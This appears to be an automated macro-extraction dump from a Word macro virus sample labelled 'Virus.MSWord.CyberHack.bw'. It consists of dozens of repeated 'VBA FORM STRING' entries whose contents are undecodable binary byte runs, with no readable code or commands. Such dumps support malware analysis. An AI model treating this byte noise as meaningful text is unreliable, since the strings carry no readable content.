VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!�����������B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{R�{R�{R�{R�{R��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��R��Z��R��R��R��R��Z��R��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z������sJ�{R��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z�������ޔ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��kƭ{ƭ{ƭ{ƭ{ƭ{Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�ν�ν�ν�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ���{91!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cZ9��s��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��Z��Z��Z��ZscJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91!scJ��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c�{Z11!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!ZJ1scB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cBkZ9)!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!������������{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJJB1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������������{�����������k������kcB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!cB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!��������������c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!�����������B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{R��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z���眥�Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z������J9!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JB1��{������������ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�Ƶ�JB1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cZ9��s��s��s��s��s��s��s��s��s��k��k��k��k��k��k��k��k��k��k��k{kJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91!{kJ��c��k��c��k��c��k��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c11!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cR1scB{cB{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{cB{cB{kJ{cB{kJ{cB{kJ{kJ{kJ{cB{kJ{kJ{kJ{cB{cB{cB{kJ{kJ{kJ{cB{cB{cB{cB{kJ{cBscB)!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!������������{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJRB)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������sZ�sZ�sZ��c�������Μ)!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!��������������c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!�����������B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{cB��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��c޵s��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JB1��k��k��k��k��{��{��{��{��{������ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ƭ{1)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cZ9��{��s��s��s��s��s��s��s��s��s��s��s��s��s��s��k��k��k��k��k{kJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91!{kJ��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��c��k��c��c��c��c��c11!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!{cB{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJscB1)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!������������{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJRB)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!�����������������{kcBJB1��k��k��{�����{ZZ9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!��������������c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!{J!{J!�����������B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k��s��s��s��s��k��k��k��k��k��k��k��k��k��kΥsΥsƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{Ƶ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ���s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cZ9�����{��{��{��{��{��{��s��s��s��s��s��s��s��s��s��s��s��s��s�kR
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91!�kR��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��c11!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cR1�sJ�sJ�sJ�sJ�sJ{kJ�sJ�sJ{kJ{kJ�sJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{cB91!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!������������{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJRB)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cZB�����������������{cZBZJ1RJBcZB{kJJB1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!��������������c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!{R){R)sJ!{R){R){R)sJ!{R){R)sJ!sJ!{R){R){R)sJ!{R){R)�Z)�����������B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�sJ��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{Z��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��kΥsΥsΥsΥsΥsΥsƭ{ƭ{Υsƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{޵{ƭ{޵{޵{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{��Z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kZ9ƭ{��{��{��{��{��{��{��{��{��{��{��{��{��s��s��s��s��s��s��s�kR
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!�kR��k��s��s��s��s��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��c11!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RB)�{R�{R�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ{kJ�sJ�sJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ91!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!������������{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJZJ1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s�����������޵�{ZZ9B1!11!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!��������������c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R)�Z)�����������BB1!�{R�{R�{R��Z��Z�{R��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��R��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��ZƜk������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
scB��Z��Z��Z��Z��Z��Z��Z��Z��Z��c��c��c��c��c��c��c��c��c��c��c��k��k��k��k��k��kƜkƜkƜkƜkΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsƜkƜk�sJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kcBƭ{��������{��{��{��{��{��{��{��{��{��{��{��{��{��s��s��s��s�sZ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!�{Z��s��s��s��s��s��s��s��s��s��s��s��s��s��k��k��k��k��k��k��k��k��k��k��k��k��k��k��c11!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91!��Z��Z�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ{kJ�sJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ1)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!������������{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJZJ1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!{R)sJ!{R)sJ!{R){R)sJ!{R)�Z1��������������c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R)�Z1�����������BkZ9�{R�{R�{R�{R�{R�{J�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R��Z�{R��Z��Z��Z��Z��R��R��R��R��R��R��R��R��R��R��R��R��R��R��R��R��R��R�Ƅ������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RB)��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��c��c��c��c��c��c��c��c��c��c��c��c��c��cƜcƜkƜkƜkƜkƜkΥkΥkΥkΥkΥkΥkΥkΥkΥkΥkΥkΥkƜkƜkƜkƜkƜkƜkkR9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kcBƭ{ƭ{��{��{��{��{��{��{��k��k��k��s��s��s��s��s��s��s��s��s�kR
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!�{Z��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��c11!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Z��c�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ{kJ{kJ�sJ{kJ�sJ�sJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJscB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!������������{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJRB)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!{R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R)�Z1��������������c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R)�Z1�����������B�sJ�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J��R��R��R�ޔ������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��R��R��R��R��R��R��R��R��R��R��R��R��R��R��Z��Z��Z��Z��c��c��c��c��c��c��c��c��c��c��c��cƜcƜcƜcƜcƜcƜcΜcΜcΜcΥkΥkΜcΜcΥkΥkΥkΜcƜcƜcƜcƜcƜc��c��c1)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
scBƭ{ƭ{ƭ{��k��k��k��k��k��k��k��k��s��s��s��s��s��s��k��k��k�kR
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JB1�{Z��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��c11!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ZΥs��Z�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ{kJ{kJ{kJ�sJ{kJ{kJ{kJ{kJ�sJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJZJ1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!������������{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJRB)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!cB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!{R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R)�Z1��������������c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{R)�Z1{R)�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�kB�����������Z�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�{J�kB�kB�kB�{J�kB�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J��������s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kB�{J�{J��R��R��R��R��R��R��R��R��R��R��R��R��R��R��R��R��R��R��R��R��c��c��c��c��c��c��c��cƜcƜcƜcƜcƜcΜcΜcΜcΜcΜcΜcΜcΜcΜcΜcΜcΜcΜcƜcƜcƜcƜcƜc��c�kB
-------------------------------------------------------------------------------
